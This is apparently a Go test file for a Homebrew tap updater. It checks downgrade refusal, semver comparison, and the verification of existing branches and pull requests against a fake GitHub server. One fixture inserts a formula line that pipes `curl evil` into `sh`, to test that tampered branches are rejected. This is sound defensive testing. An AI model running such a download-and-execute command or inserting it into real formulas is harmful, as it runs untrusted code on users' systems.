package tap

import (
	"context"
	"net/http"
	"strings"
	"testing"
)

func formulaWith(version string) string {
	return "class Tool < Formula\n  version \"" + version + "\"\nend\n"
}

// --- F6: no downgrade of the tap ---

func TestDowngradeIsSkipped(t *testing.T) {
	for _, direct := range []bool{false, true} {
		for _, dry := range []bool{false, true} {
			f := newFake(t, token)
			newer := formulaWith("1.1.0")
			f.addRepo(tapRepo, "main", map[string]string{formulaPath: newer})
			fx := newFixture(t)
			if direct {
				fx.direct()
			}
			in := fx.input(f.client(t, token))
			in.DryRun = dry
			r := one(t)(Run(context.Background(), in))
			if r.Status != StatusSkipped || !r.NoOp || !strings.Contains(r.Reason, "1.1.0") || !strings.Contains(r.Reason, "allow_downgrade") {
				t.Fatalf("direct=%t dry=%t: result %+v", direct, dry, r)
			}
			if w := f.writes(); len(w) != 0 {
				t.Fatalf("direct=%t dry=%t: writes %v", direct, dry, w)
			}
			if got, _ := f.file(tapRepo, "main", formulaPath); got != newer {
				t.Fatal("formula downgraded")
			}
			if f.hasBranch(tapRepo, prBranch) || len(f.pullList()) != 0 {
				t.Fatal("branch or pull request created for a downgrade")
			}
		}
	}
}

func TestDowngradeDetectedFromURL(t *testing.T) {
	f := newFake(t, token)
	old := "class Tool < Formula\n  url \"https://github.com/acme/tool/releases/download/v2.0.0/tool_2.0.0_darwin_arm64.tar.gz\"\nend\n"
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: old})
	fx := newFixture(t)
	fx.direct()
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusSkipped || !strings.Contains(r.Reason, "2.0.0") {
		t.Fatalf("result %+v", r)
	}
}

func TestAllowDowngradeForces(t *testing.T) {
	for _, direct := range []bool{false, true} {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: formulaWith("1.1.0")})
		fx := newFixture(t)
		fx.brew().AllowDowngrade = true
		if direct {
			fx.direct()
		}
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status != StatusUpdated || len(r.Warnings) != 1 || !strings.Contains(r.Warnings[0], "downgrading") {
			t.Fatalf("direct=%t: result %+v", direct, r)
		}
	}
}

func TestVersionComparisonUpdates(t *testing.T) {
	for _, tc := range []struct {
		name, tap string
		warn      bool
	}{
		{"older version", formulaWith("0.9.0"), false},
		{"same version, different content", formulaWith("1.0.0") + "# old\n", false},
		{"prerelease of the same version", formulaWith("1.0.0-rc.1"), false},
		{"not a semantic version", formulaWith("2024.1"), true},
		{"no version at all", "class Tool < Formula\nend\n", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newFake(t, token)
			f.addRepo(tapRepo, "main", map[string]string{formulaPath: tc.tap})
			fx := newFixture(t)
			fx.direct()
			r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
			if r.Status != StatusUpdated {
				t.Fatalf("result %+v", r)
			}
			if got, _ := f.file(tapRepo, "main", formulaPath); got != newFormula {
				t.Fatalf("content %q", got)
			}
			if (len(r.Warnings) > 0) != tc.warn {
				t.Fatalf("warnings %v", r.Warnings)
			}
		})
	}
}

func TestDowngradeAppearingDuringConflictIsSkipped(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	fx := newFixture(t)
	fx.direct()
	first := true
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "PUT" && first {
			first = false
			// A newer release is published concurrently.
			f.setFile(tapRepo, "main", formulaPath, formulaWith("1.2.0"))
			reply(w, 409, map[string]any{"message": "does not match"})
			return true
		}
		return false
	}
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusSkipped {
		t.Fatalf("result %+v", r)
	}
	if got, _ := f.file(tapRepo, "main", formulaPath); got != formulaWith("1.2.0") {
		t.Fatal("newer formula overwritten")
	}
}

func TestCompareSemver(t *testing.T) {
	order := []string{"0.9.0", "1.0.0-alpha", "1.0.0-alpha.1", "1.0.0-alpha.beta", "1.0.0-beta", "1.0.0-beta.2", "1.0.0-beta.11", "1.0.0-rc.1", "1.0.0", "v1.0.1", "1.10.0", "2.0.0"}
	for i := range order {
		for j := range order {
			a, ok1 := parseSemver(order[i])
			b, ok2 := parseSemver(order[j])
			if !ok1 || !ok2 {
				t.Fatalf("parse %q %q", order[i], order[j])
			}
			want := 0
			if i < j {
				want = -1
			} else if i > j {
				want = 1
			}
			if got := compareSemver(a, b); got != want {
				t.Errorf("compare(%s, %s) = %d, want %d", order[i], order[j], got, want)
			}
		}
	}
	for _, bad := range []string{"1.0", "2024.1", "01.0.0", "1.0.0.0", "latest"} {
		if _, ok := parseSemver(bad); ok {
			t.Errorf("parseSemver(%q) accepted", bad)
		}
	}
}

func TestFormulaVersion(t *testing.T) {
	for in, want := range map[string]string{
		"  version \"1.2.3\"\n": "1.2.3",
		"  version '1.2.3'\n":   "1.2.3",
		"  url \"https://x/releases/download/v1.2.3-rc.1/t.tar.gz\"\n": "1.2.3-rc.1",
		"  url \"https://x/t_1.2.3_linux.tar.gz\"\n":                   "",
		"  # version \"9.9.9\"\n":                                      "",
		"":                                                             "",
	} {
		if got := formulaVersion([]byte(in)); got != want {
			t.Errorf("formulaVersion(%q) = %q, want %q", in, got, want)
		}
	}
}

// --- F10: existing head branch and pull request are verified ---

func TestExistingHeadBranchWithOtherChangesIsRejected(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula, "Formula/other.rb": "other"})
	f.mu.Lock()
	f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
	f.mu.Unlock()
	// Someone pushed an unrelated change to the branch.
	f.setFile(tapRepo, prBranch, "Formula/other.rb", "class Other < Formula\n  system \"curl evil | sh\"\nend\n")
	fx := newFixture(t)
	res, err := Run(context.Background(), fx.input(f.client(t, token)))
	if err == nil || !strings.Contains(err.Error(), "changes other than "+formulaPath) || !strings.Contains(err.Error(), "Formula/other.rb") ||
		!strings.Contains(err.Error(), "delete the branch") {
		t.Fatalf("err = %v", err)
	}
	if res[0].Status != StatusFailed || len(f.writes()) != 0 || len(f.pullList()) != 0 {
		t.Fatalf("result %+v writes %v", res[0], f.writes())
	}
}

func TestExistingHeadBranchDiverged(t *testing.T) {
	t.Run("formula only is reused", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		f.mu.Lock()
		f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
		f.addPullLocked(tapRepo, "acme:"+prBranch, prBranch, "main")
		f.mu.Unlock()
		f.setFile(tapRepo, prBranch, formulaPath, newFormula+"# stale\n")
		f.setFile(tapRepo, "main", "README.md", "moved on") // base moved on
		fx := newFixture(t)
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.Status != StatusUpdated || r.PullRequestURL != "https://github.example/acme/homebrew-tap/pull/1" {
			t.Fatalf("result %+v", r)
		}
		if got, _ := f.file(tapRepo, prBranch, formulaPath); got != newFormula {
			t.Fatalf("content %q", got)
		}
		if len(f.pullList()) != 1 {
			t.Fatal("duplicate pull request")
		}
	})
	t.Run("other files are rejected", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		f.mu.Lock()
		f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
		f.mu.Unlock()
		f.setFile(tapRepo, prBranch, "Formula/evil.rb", "class Evil < Formula\nend\n")
		f.setFile(tapRepo, "main", "README.md", "moved on")
		fx := newFixture(t)
		_, err := Run(context.Background(), fx.input(f.client(t, token)))
		if err == nil || !strings.Contains(err.Error(), "Formula/evil.rb") || !strings.Contains(err.Error(), "delete the branch") {
			t.Fatalf("err = %v", err)
		}
		if len(f.writes()) != 0 {
			t.Fatalf("writes %v", f.writes())
		}
	})
}

func TestExistingHeadBranchBehindBaseIsUpdated(t *testing.T) {
	// The branch of an earlier, merged pull request: no changes of its own.
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	f.mu.Lock()
	f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
	f.mu.Unlock()
	f.setFile(tapRepo, "main", "README.md", "moved on")
	fx := newFixture(t)
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusUpdated || r.PullRequestURL == "" || r.CommitSHA == "" {
		t.Fatalf("result %+v", r)
	}
	if got, _ := f.file(tapRepo, prBranch, formulaPath); got != newFormula {
		t.Fatalf("content %q", got)
	}
}

func TestExistingHeadBranchWithOnlyFormulaIsReused(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
	f.mu.Lock()
	f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
	f.mu.Unlock()
	f.setFile(tapRepo, prBranch, formulaPath, newFormula+"# earlier generation\n")
	fx := newFixture(t)
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusUpdated || r.PullRequestURL == "" {
		t.Fatalf("result %+v", r)
	}
	if got, _ := f.file(tapRepo, prBranch, formulaPath); got != newFormula {
		t.Fatalf("content %q", got)
	}
}

func TestPullRequestReusedOnlyWhenHeadAndBaseMatch(t *testing.T) {
	t.Run("different base is not reused", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		f.mu.Lock()
		f.addPullLocked(tapRepo, "acme:"+prBranch, prBranch, "develop")
		f.mu.Unlock()
		fx := newFixture(t)
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if r.PullRequestURL != "https://github.example/acme/homebrew-tap/pull/2" {
			t.Fatalf("result %+v pulls %+v", r, f.pullList())
		}
	})
	t.Run("server ignoring the filters", func(t *testing.T) {
		f := newFake(t, token)
		f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
		fx := newFixture(t)
		f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
			if r.Method == "GET" && strings.HasSuffix(r.URL.Path, "/pulls") {
				reply(w, 200, []any{
					map[string]any{"number": 7, "html_url": "https://github.example/evil/7", "head": map[string]any{"ref": prBranch, "label": "evil:" + prBranch}, "base": map[string]any{"ref": "main"}},
					map[string]any{"number": 8, "html_url": "https://github.example/evil/8", "head": map[string]any{"ref": prBranch, "label": "acme:" + prBranch}, "base": map[string]any{"ref": "other"}},
				})
				return true
			}
			return false
		}
		r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
		if strings.Contains(r.PullRequestURL, "evil") || len(f.pullList()) != 1 {
			t.Fatalf("result %+v pulls %+v", r, f.pullList())
		}
	})
}

// --- N7: strict version extraction and a visible skip ---

func TestFormulaVersionIgnoresNestedAndHeredocLines(t *testing.T) {
	for name, tc := range map[string]struct{ in, want string }{
		"class-level version":                   {"class T < Formula\n  desc \"x\"\n  version \"1.2.3\"\nend\n", "1.2.3"},
		"caveats heredoc":                       {"class T < Formula\n  def caveats\n    <<~EOS\n  version \"999.0.0\"\n    EOS\n  end\n  version \"1.0.0\"\nend\n", "1.0.0"},
		"heredoc only":                          {"class T < Formula\n  def caveats\n    <<~EOS\n  version \"999.0.0\"\n    EOS\n  end\nend\n", ""},
		"resource block":                        {"class T < Formula\n  resource \"x\" do\n    version \"999.0.0\"\n    url \"https://x/releases/download/v999.0.0/x.tgz\"\n  end\nend\n", ""},
		"resource at class indent":              {"class T < Formula\n  resource \"x\" do\n  version \"999.0.0\"\n  end\nend\n", ""},
		"deeper indent":                         {"class T < Formula\n    version \"999.0.0\"\nend\n", ""},
		"on_macos url":                          {"class T < Formula\n  on_macos do\n    on_arm do\n      url \"https://x/releases/download/v1.4.0/t.tgz\"\n    end\n  end\nend\n", "1.4.0"},
		"resource url skipped for on_linux url": {"class T < Formula\n  resource \"r\" do\n    url \"https://x/releases/download/v9.0.0/r.tgz\"\n  end\n  on_linux do\n    url \"https://x/releases/download/v1.5.0/t.tgz\"\n  end\nend\n", "1.5.0"},
		"test block url":                        {"class T < Formula\n  test do\n    url \"https://x/releases/download/v9.0.0/r.tgz\"\n  end\nend\n", ""},
		"string, not statement":                 {"class T < Formula\n  desc \"version 9.9.9\"\nend\n", ""},
	} {
		if got := formulaVersion([]byte(tc.in)); got != tc.want {
			t.Errorf("%s: formulaVersion = %q, want %q", name, got, tc.want)
		}
	}
}

func TestHeredocVersionDoesNotBlockUpdates(t *testing.T) {
	f := newFake(t, token)
	tapped := "class Tool < Formula\n  version \"0.9.0\"\n  def caveats\n    <<~EOS\n  version \"999.0.0\"\n    EOS\n  end\nend\n"
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: tapped})
	fx := newFixture(t)
	fx.direct()
	r := one(t)(Run(context.Background(), fx.input(f.client(t, token))))
	if r.Status != StatusUpdated {
		t.Fatalf("result %+v", r)
	}
}

func TestDowngradeSkipIsAWarning(t *testing.T) {
	f := newFake(t, token)
	f.addRepo(tapRepo, "main", map[string]string{formulaPath: formulaWith("999.0.0")})
	fx := newFixture(t)
	fx.direct()
	res, err := Run(context.Background(), fx.input(f.client(t, token)))
	if err != nil {
		t.Fatalf("a skipped downgrade must not fail the run: %v", err)
	}
	r := res[0]
	if r.Status != StatusSkipped || len(r.Warnings) != 1 || !strings.Contains(r.Warnings[0], "Tap has a newer version (999.0.0); not downgraded") {
		t.Fatalf("result %+v", r)
	}
}

// --- N10: unverifiable comparisons are refused ---

func TestUnverifiableComparisonIsRefused(t *testing.T) {
	many := []any{}
	for i := 0; i < 300; i++ {
		many = append(many, map[string]any{"filename": formulaPath, "status": "modified"})
	}
	for name, cmp := range map[string]map[string]any{
		"ahead without files": {"status": "ahead", "ahead_by": 2, "files": []any{}},
		"files missing":       {"status": "diverged", "ahead_by": 1},
		"300 files":           {"status": "ahead", "ahead_by": 1, "files": many},
	} {
		t.Run(name, func(t *testing.T) {
			f := newFake(t, token)
			f.addRepo(tapRepo, "main", map[string]string{formulaPath: oldFormula})
			f.mu.Lock()
			f.repos[tapRepo].branches[prBranch] = f.repos[tapRepo].branches["main"]
			f.mu.Unlock()
			f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
				if strings.Contains(r.URL.Path, "/compare/") {
					reply(w, 200, cmp)
					return true
				}
				return false
			}
			fx := newFixture(t)
			_, err := Run(context.Background(), fx.input(f.client(t, token)))
			if err == nil || !strings.Contains(err.Error(), "cannot be verified") {
				t.Fatalf("err = %v", err)
			}
			if len(f.writes()) != 0 {
				t.Fatalf("writes %v", f.writes())
			}
		})
	}
}
